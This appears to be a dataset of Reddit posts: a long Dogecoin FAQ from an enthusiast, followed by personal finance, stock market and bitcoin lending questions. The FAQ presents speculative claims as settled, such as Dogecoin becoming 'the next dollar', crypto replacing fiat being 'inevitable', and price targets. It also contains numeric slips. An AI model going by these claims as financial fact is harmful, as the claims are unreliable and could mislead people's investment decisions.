While the statement 100 wallets own 65% is true, A lot of those top wallets are exchanges. What this means, is that legally speaking, these exchanges are holding a supply either to exchange with their customer base, or their customer base out right controls those coins. The majority of these wallets are not single individuals who can just sell off 2 billion Dogecoin at once. There are definitely some whales, but not every single large wallet is a whale. On top of that, this issue does not apply specifically to Dogecoin; but is in fact a problem with the majority of cryptocurrency yet people only point it out with Dogecoin. 

With just a bit of research you can find out which wallets are more than likely exchanges. 

DH5 (#1) is almost for sure RH. A lot of people think that. And it would make sense. They do not allow wallets, making the prices within the platform, so they'd need a much bigger wallet than everyone else.

DCUrda (#4) is an exchange for sure (tracked down several TXs to that same source). it's most likely Binance.

#7 is the burn wallet for doge Party
#18 is an exchange (most likely Crypto.com)
#21 is probably an exchange but could also be a trading bot
#22 is an exchange 

Once you take this into account it becomes clear that this is just a misconception and a non-issue 

8.  Question: Mining Dogecoin. How new Dogecoin are created and enter the market/supply. It there an infinite supply of Dogecoin being produced? Comparison to Bitcoin and the US dollar. 

Answer:
mining is the process of creating new cryptocurrency by solving a computational puzzle. mining is necessary to maintain the ledger of transactions upon which cryptocurrency is based. Miners have become very sophisticated over the last several years using complex machinery to speed up mining operations. Approximately 600,000 dogecoins are produced per hour and 5,256,000,000 (5.26 billion) per year and there are currently approximately 128,000,000,000 (128 billion) Dogecoin. Now let’s compare this information to what we know about Bitcoin. Bitcoin currently has a supply of 18.5 million. Currently 900 Bitcoin are mined per day or 328,500 per year. However, unlike Dogecoin, Bitcoins mining rate is not fixed. Bitcoin has something known as a Bitcoin halving which means at some point in the future instead of 900 per day being mined 450 are mined. Now let’s compare Dogecoin and Bitcoin to the US Dollar. The US Dollar has an estimated paper money supply (more on this covered in a later section) of approximately (1.2 to 2 trillion) and in 2019 the federal reserve printed 188.3 billion paper dollars. This means that there is 10 times more supply of dollars to Dogecoin and the government prints 37 times more dollars than Dogecoin is mined per year. It is also important to note that this increase in supply of Dogecoin is fixed. It never changes. The federal reserve can change how much they print any given year. Many people think that this means that the supply of Dogecoin is infinite or infinitely increasing. That is not true in the span of our life time. It will take approximately 24 years for the supply of Dogecoin to double and it will take 360 years for the supply of Dogecoin to reach the current supply of the US Dollar. That’s without taking into account the fact that federal reserve adds more dollars each year than Dogecoin adds to its supply each year. Technically speaking the supply of Dogecoin will eventually reach infinity if given enough time but you have to remember that infinity isn’t an actual number. You can’t mine “infinite” dogecoin because infinity isn’t a number. It’s a mathematical concept to describe something that is boundless. Dogecoin doesn’t have a boundless increase. It has a fixed increase a set amount added at a specific interval. So in practical terms for the purpose of using Dogecoin as a legitimate currency, this infinite argument against Dogecoin doesn’t matter. In fact it’s actually way better than Bitcoin at exchanging goods and services because of this fact. That is why the price per Bitcoin is in the ten thousand range the price per Dogecoin is in the cents range That is why it costs .00012 Bitcoin for milk but only 50 Dogecoin for that same commonly traded commodity. That’s why Bitcoin will be treated like digital gold. That is why Dogecoin will be considered the next dollar. The price per coin are inherently different because their supplies are different.

9.  Question: Should Dogecoin have a cap on its supply. What does having a cap mean, why do some cryptocurrency have a cap and other don’t? How does it affect the price? Will adding a cap increase the price per Dogecoin. Comparing bitcoin (capped) Dogecoin (no hard cap) 


Answer: - 
When people say they want a supply cap - what they are saying is that they want to place a limit on the total possible supply of Dogecoin. They point to bitcoin as having a cap, and since bitcoin has a cap, that must be why it is valued so high. Through scarcity. That is partially true, but it’s not because of the cap. The scarcity doesn’t come from having a cap, it comes from having a low supply and mining amount which reduces over time. Known as a bitcoin halving. 

Bitcoin and Dogecoin are two completely different cryptocurrency. Their supplies are different. Their utility is different. Having a cap does nothing in terms of the actual value of Dogecoin or bitcoin at the current moment. The cap only matters once that limit has been reached. The cap for bitcoin doesn’t happen until 2140. The price of bitcoin is due to the limited supply (18 million) relative to the global population, the bitcoin mining rate and bitcoin halving. All things that Dogecoin does differently. That doesn’t mean Dogecoin doesn’t have value. It doesn’t mean Dogecoin is infinite. It just means that they’re different.

Adding a cap won’t automatically increase the price because the cap isn’t the problem. You can’t reduce the 128 billion supply (unless you burn them or lose them). They already exist. People get confused because they don’t understand inflation and continual growth and why they are necessary for Dogecoin to a successful cryptocurrency based on the core parameters made when Dogecoin was created. They also don’t understand infinity. Dogecoin is not infinite. It can never reach infinity because infinity isn’t a number. As long as Dogecoin exists and is being mined it is not infinite. 

To further this point the original developers of Dogecoin have already stated that they will NOT be adding a cap. Adding a cap fundamentally changes Dogecoin at its core level and they’re just not going to do it. Here is the direct answer from the Dogecoin developers: “A, block reward is needed to secure Dogecoin network in a decentralized manner. Dogecoin is merge-mined with Litecoin, and that makes it somewhat secure against PoW attacks. But if Dogecoin reward will be too low, some Litecoin miners may drop Dogecoin, and our security will suffer. From this point of view, bigger reward is better. If you propose reducing the reward over time, you must also propose a solid way to keep Dogecoin secure. Now about the economic aspect. Current Dogecoin issue rate, taken relative to current total amount, is low, it's almost nothing compared to all the other factors that affect Dogecoin value. If you look at Dogecoin price chart since the introduction of current issue schedule, you will not see effects of ""inflation"" for all the wild price changes caused by other factors. And this already low issue rate gets even smaller over time, compared to total amount of dogecoins. The only real reason for these ""cap"" proposals is trying to ""sell"" Dogecoin to investors under the premise of possibly increased scarcity in the future. In my opinion, we don't need to try to appeal to investors. Dogecoin value will be increasing because of strong community and increased usage. And the fact that Dogecoin value increases is already enough for investors to jump in and increase it even more.”
You can read the full response to this directly from the developers here: https://github.com/dogecoin/dogecoin/issues/1674

Even if they DID add a cap it would actually be LESS beneficial for Dogecoin as a currency. 

Here’s some Basic economics explaining why. Inflation and deflation are common economic terms used to explain the change in the inherent value of a currency. This means that that 1 US Dollar today does not have the same value or “worth” as it did, for example, in 1950. Inflation is a situation of rising prices in the economy. A more exact definition of inflation is a sustained increase in the general price level in an economy. Deflation on the other hand occurs when the inflation rate falls below 0%, that is a negative inflation rate. While inflation reduces the value of a currency over time, a sudden deflation of a currency increases its relative value. This would allow more goods and services to be bought than before with the same amount of currency. Deflation can be a factor in leading to a recession and also result in a deflationary spiral.

Common follow up question:
What does all this mean with regards to cryptocurrency, specifically Bitcoin versus Dogecoin?

Well - Bitcoin is stagnant or deflationary over time, while Dogecoin is inflationary overtime. This is due to the way they are architected and mined, and how new coins are added into their respective markets What gets misunderstood is which one is “better” or rather ""the lesser evil"". Dogecoin doesn't need a supply limit like Bitcoin, because in the long run it will be much easier to exchange Dogecoin for goods and services, than with other crypto currencies or regular currencies for that matter. Bitcoin will continue to skyrocket in price because less and less are being mined. Bitcoin is like gold. Dogecoin is like the dollar. Bitcoin and Dogecoin have their pros and cons. Our current money is backed by signatures on debt contracts, not on real values. But it works, because we believe in it, even if it will be our downfall if it continues like this. Dogecoin is different. Dogecoin has a set amount of coins entering the market by the minute. There are plenty of spreadsheets out there showcasing exactly how much many Dogecoin will be in circulation at any given moment of time. People get confused because they think inflation is a bad thing, when in fact it is actually beneficial in small quantities and beneficial to the longevity of a currency.
Currencies have inflation - commodities don’t. Dogecoin is better suited to be a currency than Bitcoin is. Bitcoin is better suited to be a digital version of gold.

10. Question: Is a Dogecoin increase to the equivalent of one US dollar possible? Could and will it potentially happen? What would change if it does happen? How high could Dogecoin realistically rise in price? | Market cap explanation, and comparison to US currency and global FIAT currency. 

Answer: 
Economically speaking Dogecoin can rise to whatever value the market dictates based off of supply and demand. As long as demand out paces the supply then the value will rise. 

However, I see people asking what’s stopping Dogecoin from going to bitcoin levels? Well, The short answer is the supply of Dogecoin is high relative to the supply of bitcoin. Dogecoin has a current supply of 128 billion, which is why the price is lower and harder to change in value. It is easier for bitcoin to rise $1 in price because the supply of bitcoin is so low and the supply of Dogecoin is so high.  It doesn’t mean that Dogecoin can’t rise in price - just that it’s harder. 

This is the long answer.
First, It is important to note that demand does not necessarily equate to adding dollars to the system in 1 to 1 ratio. Demand can increase without ever having to add money into the system, however, adding new money into the system does help. I see people saying Dogecoin requires X million dollars per minute to account for the increase in supply. That is just completely wrong, and not how demand works. Increased Demand just means more people willing to trade Dogecoin at a higher price than people willing to trade at the current price. No net increase in fiat currency needs to be added in order for demand to increase. 

Despite not having a capped supply, using the current supply known, as well as the mining rate to account for new coins entering - you can make comparisons to other cryptocurrency to get an idea of the demand required in order for Dogecoin to reach a certain price.  The way to do this is through market cap comparisons 

Mathematically speaking market cap = price multiplied by supply
MC (Market Cap) = P (Current Price) x S (Current Supply)

Before moving forward, I want to explain market cap and the misconceptions behind its as well as how to correctly use it. 

Market cap just means how much the total supply is “valued/worth” at a certain price. The exact definition applies to stocks; not cryptocurrency how ever for our purposes the mathematics still apply.
I see people saying how Dogecoin has a current market cap of $X billion market cap and what the market cap needs to be for Dogecoin to be $1 is $128 billion. Then they say if 100 million people put $1000 in doge then doge will = $1.

THAT’S NOT HOW MARKET CAP WORKS.

*MARKET CAP DOES NOT MEAN TOTAL AMOUNT OF MONEY IN THE SYSTEM - A 6 billion dollar market cap does not mean there’s 6 billion dollars in the system. It means that the entire supply is “worth” 6 billion at the current price. When I originally wrote this people got confused so I wanted to clarify that. Market cap is a comparison tool that I use in this example to show how Dogecoin would look at each price point* I cover market cap in more detail here: https://www.reddit.com/r/dogecoin/comments/ltuevh/how_market_cap_actually_works/?utm_source=share&amp;amp;utm_medium=ios_app&amp;amp;utm_name=iossmf

Simply adding money to the system does absolutely nothing to affect market cap in the same way it does not necessarily change the price/demand. The only two variables that change the market cap are price and supply nothing else can change the market cap. 

Market caps REAL use is a comparison tool. It’s used to compare how successful a market is compared to other markets. 

If Dogecoin were to reach $1 today it would have a market cap of about 128 billion dollars ($1 x 128,495,957,919 circulating supply). Bitcoin (the most successful cryptocurrency) currently has a market cap of approximately $898,761,019,333 (~ $900 billion). This means that at $1, the total supply of Dogecoin would be “worth” about 1/7th of Bitcoins total supply. 

The take away from this comparison is that in order to reach $1 Dogecoin would require approximately 1/7th the current demand of bitcoin due to the differences in supply between Dogecoin and bitcoin. This is definitely not impossible, and an achievable goal. If Dogecoin were to reach the demand bitcoin has currently - its price would $7. Since bitcoin is the highest performing cryptocurrency, $7 dollars is the most realistic possible goal at current market conditions. Anything past $7 dollars per coin means that Dogecoin is reaching uncharted territory for cryptocurrency as it will have surpassed bitcoin.

Now for the hypothetical extension of this comparison. Everything after this point is hypothetical since we don’t have a true comparison available in the market

The estimated supply of the US dollar is about $2,000,000,000 (2 trillion), thus the market cap of the US currency is $2 trillion. If Dogecoin were to reach the equivalent market cap ($2tn / $128bn), the price per Dogecoin would have to be $15.60, thus matching the entire short-term US currency (M0 money supply in economics).

This is definitely not impossible, but it is highly highly improbable to reach such value any time soon. If that were to ever happen, it would take years. Now, the entire supply of the entire worlds fiat (short-term liquidity / paper) currency is $37 trillion. You can apply the same logic from above and see that the value of Dogecoin would have to be $288.60. If it was valued any higher than that amount, Dogecoin would be ""worth"" more than the entire world’s short-term liquidity currencies combined. It could technically go past this point, but what that would mean is that the economy behind Dogecoin would be stronger than the entire global economy of today. At that value you wouldn’t even compare it to the dollar anymore because it already surpassed all fiat currency. It’s not impossible- but is is highly unrealistic to pass that point. It is important to note that this number is not static. Which means if the market conditions change such as an increase in supply or change in price the numbers will change.


11. Question: Elon Musk - Is he important for Dogecoin? The impact of celebrities and big business supporting Dogecoin Celebrity/Influencer Involvement

Answer: (shortened to save room) Elon musk is a supporter of doge and his comments have weight but he does not control the price of Dogecoin. It was on a rise before he joined the hype train and started tweeting about it. 

12. Question: What is a 51% attack? Can it realistically happen? What are the implications if it were to happen?

Answer: A 51% attack refers to an attack on a blockchain most commonly bitcoin. Such an attack is possible but still just hypothetical. It requires group of miners to control more than 50% of the network's mining hash rate or computing power.

The attackers would be able to prevent new transactions from gaining confirmations, allowing them to halt payments between some or all users. They would also be able to reverse transactions that were completed while they were in control of the network, meaning they could double-spend coin. 

They would almost certainly not be able to create new coins or alter old blocks. A 51% attack would probably not destroy bitcoin or another blockchain-based currency outright, even if it proved highly damaging.

You may have seen an article going around talking about the 51% attack and why it will cause Dogecoin to go to zero. Regarding the 51% Hashrate attacks, Yes, they are real, and have been ever since cryptocurrencies aka Bitcoin started. The article even mentions an example. Now, if a large group of people with a lot of resources very effectively coordinated, they could indeed make a 51% attack on Dogecoin happen. But not just on Dogecoin, but also on many other, small cryptocurrencies. This is nothing new, this has basically been known for the last 10+ years. But the author of the article needs clicks, so there goes the horror-scenario headline... Possible - yes, absolutely. Likely, not very. Unless you have a large sum of people with a few resources each coordinating perfectly - that is in my honest opinion very unlikely - you could have governments, very large hedge funds, or maybe Elon Musk build a vast array of mining farms and do said 51% Hashrate attack. But again, that effort would only be worthwhile if those groups had a definite interest in destroying Dogecoin. There are probably other cryptocurrencies that would be more interesting from that perspective, such as litecoin. Of course, despite the sensationalist headline, for them clicks, the author covers their own backside by stating the following:
""In conclusion...Pretty much all the crypto besides Bitcoin and Ethereum are at material risk of a 51% attack, and it's not just a theoretical risk."" This problem is not tied specifically to Dogecoin, but to every single cryptocurrency. Now let’s do some math to calculate exactly how much it would cost in order to succeed in pulling off a 51% attack on Dogecoin. Dogecoin has a hash rate of 299.17 TH/s or 299,170,000 MH/s. If you were to use an RTX3090 which costs $2,000 US Dollars, and has a hash rate of 121 MH/s. You would need 1,260,964 RTX3090 at a cost of $2,521,928,926 dollars ($2.5 billion). Is it possible? Yes. Is it likely? No. 

13. Question: Dogecoin can only process 33 transactions per second - if Dogecoin wants to truly be a successful means of exchanging goods on a mass level it this transaction speed is not enough

Answer: the problem with this line of thinking is that they are making an assumption that the transactions per second is a permanent issues. At the current demand the transactions per second works perfectly fine and when it gets to a point where this needs to be improved, the technology is available to do so. 

Dogecoin is moving to a multichain future. There's no reason point of sale settlements would need to be conducted on the main network. Cryptocurrency is an advanced technology and there’s no reason that asset (dogecoin) and chain (main dogecoin network), are bound to each other in a way that the asset (dogecoin) cannot be enhanced by other chains.

A really good, present day example of this sort of crosschain stuff is thorchain. it's based on some work on cosmos, and it essentially gives the ability to run smart contracts, trade, do defi and liquidity pools - all without actually taking any of the other networks coin off the main chain. Bitcoins lightening network is another example. Smart network chains like flare network and thorchain will support doge. 

If transaction speed is even an issue, the solution can be provided without changing a single thing on the mainnet. It's really a non issue brought up by people just trying to find any possible reason to doubt doge. They usually bring this point up after their other arguments have been proven wrong. The only real question is what chain will develop an easy solution for doge POS payments, and which one will become standard.It's kind of amusing too, because in their 'criticism' is the implication of doge becoming a mainstream point of sale currency 

14. Question: There is a lack of developer support for Dogecoin. The technology is outdated. Why would anyone come work as a Dogecoin developer when there are thousands of other cryptocurrencies? 

Answer: the original Dogecoin developers have already began working on the project with the new found support of the community and companies accepting Dogecoin as payment. The short answer is there is already development being done due to recent weeks bringing Dogecoin back into relevancy. Two Dogecoin developers are very active in the community. You can see their posts and reach out directly. However, remember they are extremely busy working on their personal lives and adding upgrades to the underlying technology behind Dogecoin. Their usernames are u/patricklodder and u/rnicoll. 

15.  Question: if all of the above information is true why are so many people such as r/cryptocurrency and others are trying to discredit Dogecoin as legitimate cryptocurrency.  

Answer: The r/cryptocurrency and the majority of people are horribly misinformed. They find out about Dogecoin and take their biases and apply them Dogecoin before researching. R/cryptocurrency is a specific subset of society who has an extremely knowledgeable background in computer science and computer coding.  They may have a solid understanding of the technology aspect of cryptocurrency but the reason why Dogecoin will be successful is based on economics, mathematics, social theory and statistics as WELL as the underlying technology. Each of these topics is extremely intricate and each field requires years to fully master. No one person has all of the knowledge of all aspects of a cryptocurrency so when someone is attacking Dogecoin on why it won’t be successful is probably misinformed. Dogecoin is already successful. It’s been proven already. The question is HOW successful. Which nobody really knows the answer to. A large majority of r/cryptocurrency are gatekeepers who horde their knowledge while the Dogecoin community is focused on explaining and educating new people. R/cryptocurrency is notorious for being extremely serious and a lot of them feel threatened that something that started at as a joke/meme has the potential to be better at cryptocurrencies intended purpose - exchanging goods and services - than Bitcoin or any other popular cryptocurrency which is deflationary in nature. Others will try to discredit it because Dogecoin because it is novel and has gained popularity. There’s a lot of people who will discredit Dogecoin/cryptocurrency in general just because it’s new(ish) technology or because they don’t understand how it can be used. 

16. Question: Will cryptocurrency replace fiat currency. Will cryptocurrency be the next world currency. Will the next world currency be Dogecoin?

Answer: 
Cryptocurrency is in its infancy. People don’t realize the worldwide paradigm that is taking place right in front of our eyes. People are starting to see that traditional fiat (paper) currency back by centralized governments and debt are flawed and can be improved upon. Cryptocurrency is the future whether the people who can’t see it or try to disagree believe it or not. It’s inevitable. I knew it was inevitable in 2013 when I first heard about Bitcoin. A cryptocurrency will replace fiat currency in the future. Will it be Bitcoin? ETH? Dogecoin? Ada? Some other cryptocurrency that doesn’t exist yet? I don’t know. Cryptocurrency is taking the financial sector by storm - odds are there’s going to be a few key cryptocurrency for each aspect. - ones replacing fiat, ones replacing precious metals, ones replacing the banking system through deFi. Honestly getting into cryptocurrency now is like supporting the internet in the 80s - nobody knows where it’s going to be in 30 years",cryptocurrency

dogecoin,"As cryptocurrency begins to rise in popularity, so does the complete abandonment of the U.S Dollar.","As if it isn’t obvious, we are the market and we collectively control the value of what we consider currency and a medium of exchange. With this in mind, to those who have doubts about ever putting your money, whether it be EUR, USD, GBP, etc. into the crypto currency market, understand this, your money won’t ever grow like DOGE or BTC has in the last year. Sure it comes with its risks but so does holding onto that dollar bill in your pocket that does anything but grow ever since we here in the US dropped the gold standard. We are experiencing an economic shift and a paradigm shift in the way we view exchanges in the current global markets. Companies are beginning to accept more types of crypto currency as a form of payment in the last year alone than in all of time. As we begin to see a shift in the way we see money and what it can do for us in our sleep, it’s not long till more and more people start dumping their cash into crypto and beginning to use that as a form of payment. It’s not secret that in regards to the way the US government and federal reserve has been handling the US Dollar, experts like Peter Shiff (who predicted the 2008 housing crash) are predicting another crash, this time however being an inflation crash. Seeing as how the federal reserve keeps spending money it doesn’t have and the insurmountable debts climbing higher than the previous year every year, it’s safe to say the FIAT currency we’ve been used to is slowly becoming unreliable. Huge companies like Tesla and billionaires like Elon musk are beginning to buy into crypto currency and endorse this fairly new medium of exchange as we begin this new financial revolution that takes away centralized power of currency from the major banks and the federal reserve and giving it to the free markets, that’s you and me, and decentralizing it. Thus making it much harder to arbitrarily inflate the value, since we are the deciders of how much a certain crypto coin is worth and whether or not we wish to add or take value. In the end value is in the eye of the beholder. 

So, this wave that doge has been is only the beginning, the beginning of a shift in paradigm and understanding of the power we as the consumer and market driver hold with the power crypto. More and more people are seeing the value in investing into the crypto market and the waves only keep getting bigger, It’s only a matter of time till we take over, so for now

personalfinance,(California) I took delivery of my car. A week later my dealership is asking me to run my credit report again and re-do because the loan application never made it to corporate.,"I just got a really weird call from my dealership. They need me to let them run credit check again because when they did it the first time, they apparently finalized the deal without properly obtaining approval from the car's corporate office, who is the direct lender. The corporate apparently requires credit score pulled from a different credit bureau than the one the dealership pulled. So even though I put down my big down payment and signed the finance term sheet, outlining the months, taxes, and payment on the amount financed, the dealership says it needs to retroactively run my loan application again.

I've never heard of this. What is my recourse here? I don't think they are allowed to hard pull my credit twice. The contract says dealership has 10 days to cancel the contract. I suppose they could exercise that option and take back delivery. But do I have to let them run my credit again? Of course I would not let them bait and switch me with a different interest rate. I'd rather let them take back the car, which I doubt they want to do. But can they do this?",finance
stocks,Trying to understand the bear case in general markets without it being too oversimplified.,"TLDR: saying stonks only go up is as dumb as saying stocks have to go down just because they've been going up?

I swear when I look around reddit the only thing I see is either people trying to squeeze a stock, or people saying that everything is about to go bearish. I'm sorry but the mean reversion argument BY ITSELF seems incredibly dumb.

 In the last 5 months more money entered the stock market than the entire last 12 years combined. Why should long term averages be so heavily prioritized without evidence for any specific catalyst when the moving averages include a covid crash that estimated a pandemic lasting 2-5x what it's going to take us to get everyone vaccinated, probably more stimulus than anyone expected, and huge demand coming back much faster than analysts forecasted originally. Why isn't the current high valuations being looked at through the lens of we actually artifically suppressed stock prices during COVID and earnings rather than they truly deserve to be this low. Unemployment is only high because benefits have monstrously ballooned and people aren't going to go back to some shitty job that would probably pay less when the government is literally going to give them money to do whatever the fuck they want. 

The Fed absolutely has to keep rates low and they've said many times they will even if prices rise they're not going to change anything. They've already said they're going to focus on employment which will be very slow to change as previously mentioned and there's actually other reasons too but they've got more than enough justification to keep rates low and all the motivation in the world because markets represent everyone's retirements and no president is going to suffer people losing their retirement money on a rate hike its literally akin to reducing social security at this point. Inflation won't actually mean higher interest rates because the fed will keep them low forever.... 

Tax focus has so far been them mentioning a global minimum... so fucking what and yeah fucking right good luck. 

The US is like 1 and a half months from being at herd immunity and red states are already fully open and getting rid of mask mandates and it's big fucking nothing burger. 

Average savings are still historically much higher than normal in US as well last I saw or heard...

So stocks have to go down during a time when lots of industries have already corrected because some of the larger indices are so well averaged that they benefited from lockdowns and now they benefit as reopening gets more realistic. What gives with the bears I realize people feel things are overbought but they can literally remain over bought for entire 12 month periods.... I actually get ready to puke when people mention the buffet indicator as if it doesn't take just looking at stock videos on YouTube for a few minutes to get exposed to it. Stocks are forward looking into the future and there's been record amounts of money put towards propping them up Why is it such a given that they must drop without any actual negative events occurring. Just because they're hitting high on charts for like a month. I haven't seen anything about record levels of margin market wide maybe in a few meme areas but still. Maybe there is a lot more margin than I realize propping up the indices? Doesn't seem like it. 

Record stimulus, record low rates, high savings still, herd immunity being reached in 1st world countries, Unemployment certainly under no real dire threat of greatly rising. 

I'm not a permabull but I really can't understand the bear arguement just for the sake of it hit overbought for a week or a month. I actually feel like the only reason the more mid size companies not in the indices are doing poorly is just retail got super fucking bored and decided to start only throwing money at random squeezes instead of random stocks. Sure it hurt some companies but it's kind of done and over and it actually made a lot of valuations more reasonable. 


I would gladly go net short the market if I thought there was a reasonable upcoming catalyst to time but I look really far and wide wide don't see anything. Even the J&amp;J blood clot issue looks like it's not going to have any real impact and real or not they're not going to let it hamper distribution apparently. Are there any legitimate catalysts to look for for the bears? Anything besides just stocks being above moving averages that are artificially low because the pandemic was priced to last 2.5-5 years instead of the 1-2 years that it's going to? 


Love you all no matter what plays you're into I get aggravated by some stuff sometimes but I really wish the various WSB/stocks/investing communities could get over the various differences in culture and priorities and just share information better because we really are better off when we all gather in the same place and can absorb the most arguments/information.",finance

personalfinance,Should I pay my plumber?,"We own our tankless water heater and the Tuesday before Easter we had no hot water.
Called plumber #1 and in less than an hour figured it was a problem with the gas in take valve and went to go locate a part. He called back within the hour and told us he couldn’t order the part because he’s not certified with the company that makes the tank and that we needed to call a plumber that’s certified by this specific company to get parts.
We call plumber #2, confirm he is a ____ certified tech and not a problem he’ll be out Wednesday morning.
Wednesday plumber #2 shows up in the morning spends 2 hours and confirms it’s definitely the gas intake valve. The part will cost $800 and the tank will last 2-3 year before we replace the whole tank.
Great, plumber orders the part and it should FedEx by Saturday (because of Good Friday) and he’ll come out and fix it. 
Saturday- no response from plumber. Easter Monday, plumber texts me to say the office is closed. Tuesday the part hasn’t arrived...
Plumber shows up Wednesday afternoon replaces the part in an hour or so all part of the $800 quote.
Here’s where it gets dicey.
Before he leaves I ask, had the tank been fully serviced? The answer - yes.
So I say, so we won’t need to have you back for a year for the annual service? The answer - yes.
Plumber leaves and I have the first hot shower in a week. Then I start the dishes that have been piling up in the sink and as I run the hot water (within an hour of the plumber leaving) I hear a strange screeching noise. I figure that it’s coming from the new exhaust pipe he installed. So I call, no answer, leave a message  to have him return ASAP. 
5 hours later he responds and says that he’ll have to come back Thursday morning after his first appointment.
Thursday morning- no hot water. In the morning I message the plumber and confirm that I’m home all day. He arrives around 130. 
Now the heat exchanger needs to be replaced and another $800-1000. But for sure the part will ship next day and this will make the tank “like new” with no guarantee on how long it will last.
He replaces the heat exchanger and I notice it take longer for the hot water to reach the tap. Plumber says that’s normal and leaves.
NOW it take 5 minutes to get hot water in the shower to stay hot it will go hot and cold hot and cold. I’m frustrated, I don’t think this plumber knows what he’s doing or he just figured he’s the only guy in town that can service these things and wants to milk it for every penny he can make off them.
I’m still waiting for an invoice but at this point it’s been  3 weeks he’s said that everything has been fixed twice and every time I have him out he just keeps adding to the bill.
I’m tempted to give him the whole tank and just get a new one but I don’t want a lien added to the house and am open to suggestions.",finance

personalfinance,Please help a newly single woman to make a smart financial decision,"Hi Redditors, please help me to make a decision, could definitely use your input. I got divorced recently after 20 years of an abusive marriage where my ex made all of the decisions and now am learning to live on my own so I’d really appreciate your advice.

Here is my situation:

I make mid $50K. After taxes and deductions I bring home a little over $1,500 every two weeks. I currently contribute 5% to my company’s 401K (that’s how much is matched, invested in a target date fund). I have a brokerage account with Vanguard (managed by them) and Roth IRA also with Vanguard (split equally between VTSAX and VTIAX) which I started last year and have already made my full 2021 contribution. I recently inherited $80K which I put into a high yield savings account which brings next to nothing.

I am thinking if I should max out my 401K contributions ($1K per pay period). That means my paycheck will not cover my mortgage and daily expenses and I will need to use money from the HYSA. Since the interest rate is so low, I think the tax benefit of 401K contributions outweighs it. Am I correct so far? Having my paycheck cut so drastically, I won’t be able to contribute to Roth without using the HYSA money. So I guess that $80K would have to stay in the bank to cover my mortgage,  daily living expenses and Roth contributions.

The other option is to put $80K into the Vanguard brokerage account while the market is doing so well and continue contributing the same 5% to 401K.

Which option should I choose? What would be the right path? Thank you.",finance

I've been with my company for over 10 years in the same department. Promoted a few times and I've been the AP Manager for 5 years. The past year and a half has been tough. Covid, no raises, pay cuts, layoffs, long hours, etc. Got a $15k bonus at Year End. No real growth plan. Mentioned it to my boss casually, nothing set in stone. In office every day throughout the pandemic. Making $90k in the midwest. Eligible for 15% annual bonus.

We are short staffed and struggle to hire in this market. I get fed up and exhausted. I have my BS in Accounting and want to actually use it.

I was casually looking one night because I was pissed. Thought.. what could it hurt? I get an offer from another company. Lateral move, nominal increase. Significantly better benefits and work/life balance (they say 40 hours per werk, but I'm a tad skeptical with it being a manager role), closer to home. Promises of growth within their ranks. No bonus until future roles.

We've inadvertently put off kids because of my 55-60+ hours a week for years. Constant stress, frustration, etc. I've put off my MBA for the same reasons.  I'm female, mid 30s. New company has better maternity leave and STD benefits.

My company comes back and offers me $10k more and a plan, in writing, that in 3, 6, 12 months, however long we agree, I move into accounting. Originally as a Sr Staff Accounant but I can have an Accounting Manager title if I want. I was still wishy washy, still upset the first offer wasnt a manager role. I have the management experience, but not the accounting experience. I dont want to set myself up for failure. If I'm going for MBA or kids, maybe taking a step back, with the raise, and work 40 hours per week while building the foundation of my Accounting,  real time experience. $100k for a Sr Staff Accountant seems pretty good to learn everything while focusing on my personal life for a change. No bonus in the accountant role, but there would be in the manager role.

In my new role at current company, I'd WFH 2-3 days a week permanently going forward. Regardless if its Manager or not.  I was still unsure. Then right before I left today, they offer to pay for my MBA because they want me there long term and to grow. I'm still annoyed it took me finding another opportunity to make this conversation happen.

I dont have specifics, but I googled some questions to ask. Like, does this limit raises, how long do I need to commit, what's the timing of it, in what type of situation would I have to repay and get in writing what the stipulations are as they do not have a formal tuition reimbursement program. They mentioned a specific program/college which is very good and expensive. I looked up their MBA program and.. I honestly dont even know if I'd get in, but the program costs nearly $50k. I'm still paying off my 4 year degree.

I dont know what other ramifications there could be. I dont know if financially this makes sense or what I could potentially be on the hook for. This seems like an elaborate way to just keep me around for a few months, so I'm not really sure.

Bitcoin,Michael Saylor Retirement on Bitcoin,"I understand the method of borrowing against 10% of your asset for example let's say Bitcoin is 1 million dollars and you own 1 bitcoin so you borrow $100,000. You make monthly payments on that and enjoy some of the $100,000. 1 year later bitcoin rises 15% for example and your asset portfolio has risen to 1,150,000. You borrow 10% again receiving $150,000 tax free dollars and pay off the remainder of the first loan.
My question is won't this eventually catch up? Assuming bitcoin constantly goes up 15% yearly and the interest rate is 5.5% each loan for example wouldn't you be accruing more and more debt until you over borrow and lose all of it?
Also what happens in the event of death on these loans? Will it be passed to next generation?",cryptocurrency

Bitcoin,Blockfi vs. Celsius vs. Nexo vs. Ledn - earning passive income on BTC and stablecoin,"EDIT: spreadsheet updated with May 2021 rates. Blockfi dropped interest rates significantly on BTC and ETH. https://blockfi.com/rates/

Also - Please note for any aggressive active trading, using these services will hold you back, as you will need to wait at least 24 hours to make withdrawals or transfers in most cases - these services are useful only if you’re hodling.

Thanks to some of the comments, I’m now aware there are many other similar services such as crypto.com and Voyager. I’m transitioning into active trading rather than hodling and don’t currently have time to research. If anyone would like to update the spreadsheet with their favorite passive interest service, I’ll add you as an editor to the googlesheet.

Also - there are interesting potentially far more lucrative yields to be had in staking with de-fi, although perhaps with even less liquidity. 

End EDIT

I made a spreadsheet that compares Blockfi, Celsius, Nexo, and Ledn as vehicles for earning passive income on your BTC (also ETH and stablecoin). I also included some notes on Coinbase and Coinbase Pro. As I am in the US, I only focused on policies that apply to US users. 

\*If this is violating some kind of posting rule, sorry, I'm sure the autobot or some mod will take it down. The idea of earning passive yield obviously goes against ""not your keys, not your coins"", but if here's info about how to do it, if you're open to it.

[https://docs.google.com/spreadsheets/d/1-O-fhMMin5dZXq6Ailltpzrb5yjKi-KEqrSnkjXVsqI/edit#gid=0](https://docs.google.com/spreadsheets/d/1-O-fhMMin5dZXq6Ailltpzrb5yjKi-KEqrSnkjXVsqI/edit#gid=0)

The key takeaways I gathered in the process of onboarding these apps: 

\- Blockfi or Coinbase/Coinbase Pro seem to be good ways to get fiat from a bank account into cryptospace. 

\- So far, I've found that Coinbase Pro is the best way to buy crypto. (Please comment below if you know a better way.) Coinbase Pro fees are decently low, plus fees can be claimed as a tax loss, unlike buying with a spread on Blockfi. Celsius uses partners that charge a ton in fees when you buy crypto or do anything like that on their platform. (What's up with that, Celsius?) Yes, you can get a slightly better deal on Binance, but I had trouble getting verified on Binance (like days of waiting and my profile still says ""we're verifying the stuff you sent us!"" I think their US version gets easily overwhelmed with high levels of trading activity.) 

